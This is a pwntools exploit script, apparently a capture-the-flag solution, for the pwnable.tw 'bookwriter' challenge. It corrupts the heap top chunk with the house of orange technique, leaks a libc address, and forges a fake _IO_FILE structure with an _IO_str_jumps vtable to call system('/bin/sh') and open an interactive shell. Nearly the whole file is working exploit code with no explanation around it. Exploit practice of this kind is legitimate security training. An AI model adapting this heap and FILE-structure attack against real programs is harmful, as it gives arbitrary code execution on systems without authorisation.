#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 1

if local:
	cn = process('./bookwriter',env={"LD_PRELOAD":"./libc_64.so.6"})
	bin = ELF('./bookwriter')
	libc = ELF('./libc_64.so.6')
else:
	cn = remote('chall.pwnable.tw', 10304)
	bin = ELF('./bookwriter')
	libc = ELF('./libc_64.so.6')

def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()


def add(s,l):
	cn.recvuntil('Your choice :')
	cn.sendline('1')
	cn.recvuntil('Size of page :')
	cn.sendline(str(l))
	cn.recvuntil('Content :')
	cn.send(s)

def view(idx):
	cn.recvuntil('Your choice :')
	cn.sendline('2')
	cn.recvuntil('Index of page :')
	cn.sendline(str(idx))


def edit(idx,s):
	cn.recvuntil('Your choice :')
	cn.sendline('3')
	cn.recvuntil('Index of page :')
	cn.sendline(str(idx))
	cn.recvuntil('Content:')
	cn.send(s)


def info():
	cn.recvuntil('Your choice :')
	cn.sendline('4')

def set_author(s):
	cn.recvuntil('Author :')
	cn.send(s)

set_author('a'*64)
add('A'*0x18,0x18)#0
edit(0,'\x00'*0x18)

#house of orange
add('B'*0x88,0x88)#1
edit(1,'B'*0x88)
#topchunk size = 0x20f51 --> 0xf51
edit(1,'B'*0x88 + '\x51\x0f\x00')

#triger int_free
add('C',0x1000)#2

add('D'*8,0x200)#3
view(3)
cn.recvuntil('D'*8)

libc.address = u64(cn.recv(6).ljust(8,'\x00'))-0x3c3b20-1640
_IO_str_jumps = libc.address + 0x3c27a0
system = libc.sym['system']
_IO_list_all=libc.sym['_IO_list_all']
binsh = libc.search('/bin/sh\x00').next()

success('libc: '+hex(libc.address))
success('system: '+hex(system))
success('_IO_list_all: '+hex(_IO_list_all))
success('_IO_str_jumps: '+hex(_IO_str_jumps))
success('binsh: '+hex(binsh))

for i in range(4,9):
	add(str(i)*0x10,0x10)

pay='\x00'*0x350

from FILE import *
context.arch = 'amd64'
fake_file = IO_FILE_plus_struct()
fake_file._flags = 0
fake_file._IO_read_ptr = 0x61
fake_file._IO_read_base =_IO_list_all-0x10
fake_file._IO_buf_base = binsh
fake_file._mode = 0
fake_file._IO_write_base = 0
fake_file._IO_write_ptr = 1
fake_file.vtable = _IO_str_jumps-8

pay+=str(fake_file).ljust(0xe8,'\x00')+p64(system)
edit(0,pay)
gdb.attach(cn)
pause()

cn.recvuntil('Your choice :')
cn.sendline('1')
cn.recvuntil('Size of page :')
cn.sendline('1')

cn.interactive()